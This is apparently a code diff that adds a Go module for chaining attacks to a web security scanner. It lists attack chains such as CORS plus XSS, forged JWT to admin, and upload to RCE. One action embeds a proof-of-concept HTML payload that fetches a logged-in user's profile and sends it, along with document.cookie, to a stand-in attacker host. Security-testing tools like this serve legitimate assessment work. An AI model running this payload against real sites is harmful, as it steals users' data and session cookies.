@@ -1,0 +1,279 @@
+package hacker
+
+import (
+	"context"
+	"fmt"
+
+	"github.com/NICE-DEV226/nice-Scan/internal/transport"
+)
+
+type ChainPattern struct {
+	Name     string
+	Requires []string
+	Impact   string
+	Risk     float64
+}
+
+type Chainer struct {
+	patterns []ChainPattern
+	executed map[string]bool
+}
+
+func NewChainer() *Chainer {
+	return &Chainer{
+		executed: make(map[string]bool),
+		patterns: []ChainPattern{
+			{
+				Name:     "CORS → XSS Data Exfiltration",
+				Requires: []string{"has_cors", "has_xss"},
+				Impact:   "Data exfiltration via CORS + XSS — steal sensitive data cross-origin",
+				Risk:     9.0,
+			},
+			{
+				Name:     "JWT → Admin Access",
+				Requires: []string{"has_forged_jwt", "has_admin"},
+				Impact:   "Account takeover via forged JWT used against admin endpoints",
+				Risk:     9.5,
+			},
+			{
+				Name:     "Token → Admin Access",
+				Requires: []string{"has_token", "has_admin"},
+				Impact:   "Privilege escalation via reused token on admin endpoints",
+				Risk:     8.5,
+			},
+			{
+				Name:     "Credentials → Login → Admin",
+				Requires: []string{"has_login", "has_admin"},
+				Impact:   "Valid credentials provide access to admin panel",
+				Risk:     9.0,
+			},
+			{
+				Name:     "CORS → API Access",
+				Requires: []string{"has_cors", "has_api"},
+				Impact:   "Cross-origin requests allowed to API — potential data access",
+				Risk:     7.0,
+			},
+			{
+				Name:     "IDOR → Data Access",
+				Requires: []string{"has_idor"},
+				Impact:   "Insecure direct object reference allows accessing other users' data",
+				Risk:     8.0,
+			},
+			{
+				Name:     "Secrets → Cloud Compromise",
+				Requires: []string{"has_secret"},
+				Impact:   "Exposed secrets (AWS keys, tokens) allow cloud account compromise",
+				Risk:     10.0,
+			},
+			{
+				Name:     "Upload → RCE",
+				Requires: []string{"has_upload"},
+				Impact:   "Unrestricted file upload allows remote code execution",
+				Risk:     10.0,
+			},
+			{
+				Name:     "Login → Register → Privilege Escalation",
+				Requires: []string{"has_login", "has_register"},
+				Impact:   "Registration with elevated privileges leads to account takeover",
+				Risk:     8.0,
+			},
+		},
+	}
+}
+
+func (c *Chainer) DetectAndExecute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) []Action {
+	caps := kb.GetCapabilities()
+	capMap := make(map[string]bool)
+	for _, cp := range caps {
+		capMap[cp.Name] = true
+	}
+
+	var spawned []Action
+
+	for _, p := range c.patterns {
+		if c.executed[p.Name] {
+			continue
+		}
+
+		allMet := true
+		for _, req := range p.Requires {
+			if !capMap[req] {
+				allMet = false
+				break
+			}
+		}
+		if !allMet {
+			continue
+		}
+
+		c.executed[p.Name] = true
+
+		var chainAction Action
+		switch p.Name {
+		case "CORS → XSS Data Exfiltration":
+			chainAction = &CORSXSSChainAction{pattern: p}
+		case "JWT → Admin Access":
+			chainAction = &JWTAdminChainAction{pattern: p}
+		default:
+			chainAction = &GenericChainAction{pattern: p}
+		}
+
+		spawned = append(spawned, chainAction)
+	}
+	return spawned
+}
+
+func (c *Chainer) DetectChains(kb *Knowledge) []AttackChain {
+	caps := kb.GetCapabilities()
+	capMap := make(map[string]bool)
+	for _, cp := range caps {
+		capMap[cp.Name] = true
+	}
+
+	var chains []AttackChain
+	for _, p := range c.patterns {
+		allMet := true
+		for _, req := range p.Requires {
+			if !capMap[req] {
+				allMet = false
+				break
+			}
+		}
+		if allMet {
+			chains = append(chains, AttackChain{
+				Name:      p.Name,
+				Impact:    p.Impact,
+				RiskScore: p.Risk,
+				Target:    kb.Target(),
+			})
+		}
+	}
+	return chains
+}
+
+type GenericChainAction struct {
+	pattern ChainPattern
+}
+
+func (a *GenericChainAction) Metadata() ActionMetadata {
+	return ActionMetadata{
+		Name:        "Chain: " + a.pattern.Name,
+		Description: a.pattern.Impact,
+		Priority:    1,
+		Requires:    a.pattern.Requires,
+		Provides:    []string{},
+	}
+}
+
+func (a *GenericChainAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
+	findings := []Finding{
+		{
+			Type:        "chain",
+			Name:        a.pattern.Name,
+			Severity:    SevCritical,
+			Description: a.pattern.Impact,
+			Evidence:    fmt.Sprintf("Risk Score: %.0f/10", a.pattern.Risk),
+		},
+	}
+	return ActionResult{Findings: findings}
+}
+
+type CORSXSSChainAction struct {
+	pattern ChainPattern
+}
+
+func (a *CORSXSSChainAction) Metadata() ActionMetadata {
+	return ActionMetadata{
+		Name:        "Chain: CORS+XSS Data Exfil",
+		Description: "Generate PoC HTML that exfiltrates data via CORS",
+		Priority:    1,
+		Requires:    []string{"has_cors", "has_xss"},
+		Provides:    []string{},
+	}
+}
+
+func (a *CORSXSSChainAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
+	pocHTML := `<!DOCTYPE html>
+<html>
+<body>
+<script>
+  // CORS + XSS Data Exfiltration PoC
+  // Generated by NICE HACKER Decision Engine
+  
+  const TARGET = "` + target + `";
+  const CALLBACK = "https://attacker-server.com/exfil";
+  
+  async function exfil() {
+    try {
+      const resp = await fetch(TARGET + "/api/user/profile", {
+        credentials: "include"
+      });
+      const data = await resp.text();
+      
+      // Exfiltrate via callback
+      await fetch(CALLBACK + "?data=" + btoa(data));
+      
+      // Also try to steal cookies
+      document.location = CALLBACK + "?cookie=" + document.cookie;
+    } catch(e) {
+      // Try image beacon fallback
+      new Image().src = CALLBACK + "?error=" + encodeURIComponent(e.message);
+    }
+  }
+  
+  exfil();
+</script>
+</body>
+</html>`
+
+	kb.AddSecret("CORS+XSS PoC generated — manual deployment required")
+
+	findings := []Finding{
+		{
+			Type:        "chain_exploit_poc",
+			Name:        "CORS+XSS Data Exfiltration — PoC Ready",
+			Severity:    SevCritical,
+			Description: "Generate crafted HTML page that exfiltrates authenticated data via CORS + XSS",
+			Evidence:    pocHTML[:300] + "...",
+			Details:     map[string]string{"html": pocHTML},
+		},
+	}
+	return ActionResult{Findings: findings}
+}
+
+type JWTAdminChainAction struct {
+	pattern ChainPattern
+}
+
+func (a *JWTAdminChainAction) Metadata() ActionMetadata {
+	return ActionMetadata{
+		Name:        "Chain: JWT → Admin PWN",
+		Description: "Use forged JWT to access admin endpoints",
+		Priority:    1,
+		Requires:    []string{"has_forged_jwt", "has_admin"},
+		Provides:    []string{},
+	}
+}
+
+func (a *JWTAdminChainAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
+	jwtToken := kb.Session.GetActiveJWT()
+	findings := []Finding{
+		{
+			Type:        "chain_exploit_jwt_admin",
+			Name:        "JWT → Admin Access Chain",
+			Severity:    SevCritical,
+			Description: fmt.Sprintf("Attempting admin access with forged JWT on %s", target),
+			Evidence:    fmt.Sprintf("Token: %s", jwtToken),
+		},
+	}
+
+	if jwtToken != "" {
+		kb.Session.SetActiveJWT(jwtToken)
+		kb.AddCapability(Capability{
+			Name:   "has_admin_session",
+			Target: target,
+		})
+	}
+
+	return ActionResult{Findings: findings}
+}
